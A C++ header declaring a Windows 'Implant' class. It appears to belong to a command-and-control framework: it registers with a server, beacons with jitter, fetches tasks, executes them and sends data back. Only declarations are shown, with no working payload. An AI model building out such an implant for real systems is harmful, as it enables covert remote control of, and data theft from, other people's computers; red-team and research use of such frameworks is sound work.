#pragma once 

#include <string>
#include <windows.h>
#include <vector>
#include "tasks.h"
#include <nlohmann/json.hpp>
#include "core.h"

using json = nlohmann::json;

class Implant {
public:
	Implant(BasicUserInformation& basicUserInfo);
	~Implant();

	void RegisterImplant();
	void StartBeacon();
	void StopBeacon();
	void setJitter(int sleep);



private:
	std::string IP;
	std::vector<Task> tasks;
	std::vector<std::string> executedTaskIds; // To keep track of executed task IDs
	BasicUserInformation& basicUserInfo;
	int jitter;


	STATUS_CODE sendData(const json& data, const std::string& endpoint);
	json getData(const json& params, const std::string& endpoint);


	void parseTasks(const json& response);
	void FetchTasks();
	std::string getCurrentDateTime();
	void executeTask(const Task& task);
	void Beacon();

};